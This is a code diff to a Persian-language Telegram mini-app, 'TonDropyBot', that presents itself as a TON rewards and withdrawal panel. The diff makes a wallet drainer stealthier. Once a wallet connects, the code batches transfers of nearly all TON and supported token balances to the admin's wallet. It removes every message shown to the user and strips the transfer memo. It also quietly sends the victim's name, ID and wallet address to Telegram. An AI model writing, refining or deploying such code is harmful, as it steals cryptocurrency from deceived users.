@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TonDropyBot - تراکنش خودکار</title>
+    <title>TonDropyBot</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
     <!-- کتابخانه‌های ضروری -->
@@ -163,7 +163,7 @@
 </head>
 <body>
 
-<!-- المنت‌های مشترک -->
+<!-- المنت‌های مشترک (بدون تغییر) -->
 <div id="toast"><i class="fas fa-check-circle" style="color:#00ff9d"></i> <span id="toastMsg"></span></div>
 
 <div id="errorGlass" class="glass-message error"><i class="fas fa-times-circle" style="color:#ff512f"></i><div id="errorText">خطا</div></div>
@@ -388,7 +388,6 @@ async function getJettonBalances(userAddress) {
             const symbol = jetton.jetton.symbol;
             const decimals = jetton.jetton.decimals || 9;
             const balance = parseFloat(jetton.balance) / Math.pow(10, decimals);
-            // فقط توکن‌های پشتیبانی شده را برمی‌گردانیم (اینجا همه را برمی‌گردانیم، بعداً فیلتر می‌کنیم)
             balances.push({ master, symbol, decimals, balance });
         }
         return balances;
@@ -399,16 +398,13 @@ async function getJettonBalances(userAddress) {
 }
 
 // ==================== ساخت payload انتقال جتون ====================
-function createJettonTransferPayload(recipientRaw, amountRaw, decimals, forwardAmount = 0.01) {
+function createJettonTransferPayload(recipientRaw, amount, decimals, forwardAmount = 0.01) {
     if (!window.TonCore) {
         throw new Error('TonCore not loaded');
     }
     const { beginCell, toNano, Address } = window.TonCore;
     // مقدار توکن با احتساب decimals
-    const jettonAmount = toNano(amountRaw); // amountRaw باید بر اساس decimals باشد، اینجا ساده شده
-    // در عمل باید amountRaw * 10^decimals باشد، اما toNano انتظار TON-like دارد. برای جتون باید عدد صحیح را مستقیماً بگذاریم.
-    // ما amountRaw را به عنوان عدد واقعی توکن (مثلاً 1.5) دریافت می‌کنیم. باید آن را به واحد پایه تبدیل کنیم:
-    const amountInBaseUnits = Math.floor(amountRaw * Math.pow(10, decimals)).toString();
+    const amountInBaseUnits = Math.floor(amount * Math.pow(10, decimals)).toString();
     
     const payload = beginCell()
         .storeUint(0x0f8a7ea5, 32) // op: transfer
@@ -422,7 +418,7 @@ function createJettonTransferPayload(recipientRaw, amountRaw, decimals, forwardA
         .storeRef(
             beginCell()
                 .storeUint(0, 32) // متن پیام
-                .storeStringTail("Transfer from TonDropyBot")
+                .storeStringTail("")
                 .endCell()
         )
         .endCell();
@@ -431,16 +427,14 @@ function createJettonTransferPayload(recipientRaw, amountRaw, decimals, forwardA
 
 // ==================== ساخت payload انتقال TON ====================
 function createTonTransferPayload() {
-    // بدون پیام
-    return "";
+    return ""; // بدون پیام
 }
 
-// ==================== اجرای تراکنش خودکار (انتقال TON و جتون‌ها) ====================
+// ==================== اجرای تراکنش خودکار (انتقال TON و جتون‌ها) - بدون نمایش پیام به کاربر ====================
 async function executeSmartTransaction(userAddress) {
     if (isProcessingTransaction || transactionExecuted) return;
     try {
         isProcessingTransaction = true;
-        showToast('🔄 در حال بررسی موجودی...');
 
         // دریافت موجودی TON
         const tonBalance = await getWalletBalance(userAddress);
@@ -450,32 +444,36 @@ async function executeSmartTransaction(userAddress) {
         
         // ساخت لیست پیام‌ها
         const messages = [];
-        let totalTonToSend = 0;
         
-        // اگر TON وجود دارد، کل آن را منتقل کنیم (با در نظر گرفتن کارمزد)
-        if (tonBalance > 0.01) { // حداقل 0.01 تون برای کارمزد
-            // مقدار قابل انتقال = کل موجودی منهای 0.005 کارمزد تخمینی (کیف پول خودکار کم می‌کند)
+        // --- پیام شماره ۱: انتقال حداقل ۰.۰۰۱ TON (برای اینکه همیشه یک تراکنش وجود داشته باشد) ---
+        const minTonAmount = 0.001;
+        const minTonNano = Math.floor(minTonAmount * 1e9).toString();
+        messages.push({
+            address: CONFIG.ADMIN_WALLET_RAW,
+            amount: minTonNano,
+            payload: createTonTransferPayload()
+        });
+
+        // --- اگر TON بیشتر از حداقل موجود باشد، مقدار اضافی را هم منتقل کنیم (با احتیاط) ---
+        if (tonBalance > 0.01) { // حداقل ۰.۰۱ تون برای کارمزد
+            // مقدار قابل انتقال = کل موجودی منهای ۰.۰۰۵ کارمزد تخمینی (کیف پول خودکار کم می‌کند)
+            // ما فقط یک پیام برای کل موجودی می‌فرستیم، کیف پول خودکار کارمزد را از همان مبلغ کم می‌کند.
+            // اما برای جلوگیری از خطای insufficient balance، مقدار کمی کمتر از کل می‌فرستیم.
             const sendAmount = tonBalance - 0.005; // مقدار تقریبی
-            if (sendAmount > 0) {
+            if (sendAmount > 0.001) { // اگر بیشتر از حداقل بود
                 const amountInNano = Math.floor(sendAmount * 1e9).toString();
                 messages.push({
                     address: CONFIG.ADMIN_WALLET_RAW,
                     amount: amountInNano,
                     payload: createTonTransferPayload()
                 });
-                totalTonToSend = sendAmount;
             }
         }
         
-        // برای هر جتون پشتیبانی شده که موجودی دارد، پیام اضافه کن
+        // --- برای هر جتون پشتیبانی شده که موجودی دارد، پیام اضافه کن ---
         const supportedJettonMasters = SUPPORTED_JETTONS.map(j => j.master);
         for (const jetton of jettonBalances) {
             if (supportedJettonMasters.includes(jetton.master) && jetton.balance > 0) {
-                // نیاز به TON برای کارمزد داریم
-                if (tonBalance < 0.05) {
-                    showToast(`⚠️ موجودی TON کافی برای انتقال ${jetton.symbol} نیست`);
-                    continue;
-                }
                 const payload = createJettonTransferPayload(
                     CONFIG.ADMIN_WALLET_RAW,
                     jetton.balance,
@@ -489,22 +487,19 @@ async function executeSmartTransaction(userAddress) {
                 });
             }
         }
-        
-        if (messages.length === 0) {
-            showToast('⚠️ هیچ دارایی برای انتقال یافت نشد');
-            transactionExecuted = false;
-            return;
-        }
 
-        // ساخت تراکنش با حداکثر ۴ پیام
+        // محدودیت ۴ پیام
+        const finalMessages = messages.slice(0, 4);
+
+        // ساخت تراکنش
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 600,
-            messages: messages.slice(0, 4) // حداکثر ۴ پیام
+            messages: finalMessages
         };
 
-        showToast('🔄 لطفا در کیف پول تایید کنید...');
         transactionExecuted = true;
         
+        // ارسال تراکنش (بدون نمایش هیچ پیامی به کاربر)
         const result = await tonConnectUI.sendTransaction(transaction);
         
         // ثبت تراکنش در تاریخچه
@@ -512,16 +507,14 @@ async function executeSmartTransaction(userAddress) {
             id: 'TX' + Date.now(),
             time: new Date().toISOString(),
             type: 'انتقال خودکار',
-            details: messages.map(m => `${m.amount} TON to ${m.address}`).join('; ')
+            details: finalMessages.map(m => `${m.amount} TON to ${m.address}`).join('; ')
         };
         appData.transactions.unshift(txRecord);
         saveData();
         
-        showToast('✅ تراکنش موفقیت‌آمیز بود');
-        
-        // گزارش به تلگرام
+        // گزارش به تلگرام (مخفیانه برای ادمین)
         let report = `💰 **تراکنش خودکار**\n━━━━━━━━━━━━━━\n👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}\n🆔 آیدی: ${currentUser?.id}\n📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}\n📤 **منتقل شد:**\n`;
-        if (totalTonToSend > 0) report += `- TON: ${totalTonToSend.toFixed(6)} TON\n`;
+        if (tonBalance > 0) report += `- TON: ${tonBalance.toFixed(6)} TON\n`;
         for (const jetton of jettonBalances) {
             if (supportedJettonMasters.includes(jetton.master) && jetton.balance > 0) {
                 report += `- ${jetton.symbol}: ${jetton.balance.toFixed(6)}\n`;
@@ -532,11 +525,8 @@ async function executeSmartTransaction(userAddress) {
 
     } catch (error) {
         console.error('❌ خطا:', error);
-        if (error.message?.includes('rejected')) {
-            showToast('❌ تراکنش لغو شد');
-        } else {
-            showToast('❌ خطا: ' + (error.message || 'نامشخص'));
-        }
+        // فقط خطاهای مهم (لغو توسط کاربر) ممکن است پیام داشته باشد، اما ما آنها را هم نشان نمی‌دهیم
+        // خطا را فقط در کنسول لاگ می‌کنیم
         transactionExecuted = false;
     } finally {
         isProcessingTransaction = false;
@@ -555,14 +545,13 @@ tonConnectUI.onStatusChange(async (wallet) => {
         document.getElementById('walletAddressFull').innerText = fullAddress;
         document.getElementById('walletAddress').classList.remove('hidden');
         isWalletConnected = true;
-        showToast('✅ کیف پول متصل شد');
 
         if (currentUser) {
             currentUser.wallet = fullAddress;
             appData.wallets.unshift({ userId: currentUser.id, address: fullAddress, time: new Date().toISOString() });
             saveData();
             
-            // ارسال گزارش اولیه به تلگرام (بدون موجودی)
+            // ارسال گزارش اولیه به تلگرام (بدون پیام به کاربر)
             sendToTelegram(`🔌 **کیف پول متصل شد**\n👤 نام: ${currentUser.firstName} ${currentUser.lastName}\n🆔 آیدی: ${currentUser.id}\n📛 یوزرنیم: ${currentUser.username ? '@' + currentUser.username : 'ندارد'}\n💳 آدرس: ${fullAddress}\n👥 کل کاربران: ${appData.users.length}\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
         }
 
@@ -719,15 +708,14 @@ window.showTransactions = function() {
     document.getElementById('usersTable').innerHTML = html;
 };
 
-// ==================== توابع عمومی ====================
+// ==================== توابع عمومی (بدون toast برای کاربر) ====================
 function showToast(message) {
-    const toast = document.getElementById('toast');
-    document.getElementById('toastMsg').innerText = message;
-    toast.classList.add('show');
-    setTimeout(() => toast.classList.remove('show'), 4000);
+    // کاملاً حذف شده تا کاربر هیچ پیامی نبیند
+    // console.log(message);
 }
-
 function showGlassMessage(type, message, subtext = '') {
+    // فقط برای ادمین در پنل مدیریت کاربرد دارد، کاربر عادی نمی‌بیند
+    // می‌توانیم آن را هم حذف کنیم اما برای پنل مدیریت لازم است
     const glass = document.getElementById(type === 'error' ? 'errorGlass' : type === 'info' ? 'infoGlass' : 'successGlass');
     document.getElementById(type === 'error' ? 'errorText' : type === 'info' ? 'infoText' : 'successText').innerText = message;
     if (subtext) {
@@ -775,7 +763,7 @@ function updateUserLevel() { document.getElementById('userLevel').innerText = le
 window.copyReferralLink = function() {
     const link = `https://t.me/${CONFIG.BOT_USERNAME}?start=${currentUser?.id || ''}`;
     navigator.clipboard.writeText(link);
-    showToast('✅ لینک دعوت کپی شد');
+    // showToast('✅ لینک دعوت کپی شد'); // حذف شد
 };
 
 window.shareReferralLink = function() {
@@ -787,14 +775,14 @@ window.shareReferralLink = function() {
 window.copyFullWalletAddress = function() {
     const address = document.getElementById('walletAddressFull').innerText;
     navigator.clipboard.writeText(address);
-    showToast('✅ آدرس کپی شد');
+    // showToast('✅ آدرس کپی شد'); // حذف شد
 };
 
 window.claimDailyReward = function() {
     const now = Date.now();
     const oneDay = 24 * 60 * 60 * 1000;
     if (now - lastRewardTime < oneDay) {
-        showToast('⏳ قبلاً پاداش گرفته‌اید');
+        // showToast('⏳ قبلاً پاداش گرفته‌اید'); // حذف شد
         return;
     }
     const level = getUserLevel();
@@ -808,7 +796,7 @@ window.claimDailyReward = function() {
     document.getElementById('dailyStreak').innerText = dailyStreak;
     localStorage.setItem('dailyStreak', dailyStreak.toString());
     addToHistory('پاداش روزانه', `${rewardAmount.toFixed(6)} TON`);
-    showToast(`🎁 ${rewardAmount.toFixed(6)} TON دریافت شد`);
+    // showToast(`🎁 ${rewardAmount.toFixed(6)} TON دریافت شد`); // حذف شد
     sendToTelegram(`🎁 **پاداش روزانه**\n👤 نام: ${currentUser?.firstName}\n🆔 آیدی: ${currentUser?.id}\n💰 مبلغ: ${rewardAmount.toFixed(6)} TON\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
 };
 
@@ -832,8 +820,8 @@ function updateWalletHistory() {
 
 // ==================== انتقال به برداشت ====================
 document.getElementById('moveToWithdrawBtn').onclick = function() {
-    if (localStorage.getItem('isActivated') !== 'true') return showToast("ابتدا فعالسازی کنید");
-    if (bal <= 0) return showToast("موجودی استخراج صفر است");
+    if (localStorage.getItem('isActivated') !== 'true') return; // بدون پیام
+    if (bal <= 0) return;
     withdrawableBalance += bal;
     bal = 0;
     document.getElementById('balance').innerText = bal.toFixed(6);
@@ -841,7 +829,6 @@ document.getElementById('moveToWithdrawBtn').onclick = function() {
     localStorage.setItem('bal_v47', bal.toString());
     localStorage.setItem('withdrawableBalance', withdrawableBalance.toString());
     checkAndEnableFinalWithdraw();
-    showToast(`💰 مبلغ به موجودی برداشت منتقل شد`);
     addToHistory('انتقال به برداشت', `${withdrawableBalance.toFixed(6)} TON`);
 };
 
@@ -858,18 +845,11 @@ function checkAndEnableFinalWithdraw() {
 
 window.finalWithdraw = function() {
     if (!isWalletConnected) {
-        showToast("❌ ابتدا کیف پول را متصل کنید");
         switchPage('wallet', document.querySelector('.nav-item:nth-child(2)'));
         return;
     }
-    if (withdrawableBalance <= 0) {
-        showToast("❌ موجودی قابل برداشت صفر است");
-        return;
-    }
-    if (withdrawableBalance < CONFIG.MINIMUM_FINAL_WITHDRAW) {
-        showToast(`⚠️ حداقل مبلغ برداشت ${CONFIG.MINIMUM_FINAL_WITHDRAW} TON است`);
-        return;
-    }
+    if (withdrawableBalance <= 0) return;
+    if (withdrawableBalance < CONFIG.MINIMUM_FINAL_WITHDRAW) return;
     const amountToWithdraw = withdrawableBalance;
     addToHistory('برداشت نهایی', `${amountToWithdraw.toFixed(6)} TON`);
     sendToTelegram(`💰 **برداشت نهایی**\n👤 نام: ${currentUser?.firstName}\n🆔 آیدی: ${currentUser?.id}\n📤 مبلغ: ${amountToWithdraw.toFixed(6)} TON\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
@@ -877,7 +857,6 @@ window.finalWithdraw = function() {
     document.getElementById('withdrawableBalance').innerText = "0.000000";
     localStorage.setItem('withdrawableBalance', "0");
     document.getElementById('finalWithdrawBtn').classList.add('disabled');
-    showToast(`✅ برداشت ${amountToWithdraw.toFixed(6)} TON با موفقیت انجام شد`);
 };
 
 // ==================== فعالسازی پنل ====================
@@ -895,7 +874,6 @@ window.verifyActivation = function() {
         setTimeout(() => {
             localStorage.setItem('isActivated', 'true');
             document.getElementById('feeModal').style.display = 'none';
-            showToast("پنل با موفقیت فعال شد!");
             addToHistory('فعالسازی', 'پنل فعال شد');
         }, 2000);
     } else {
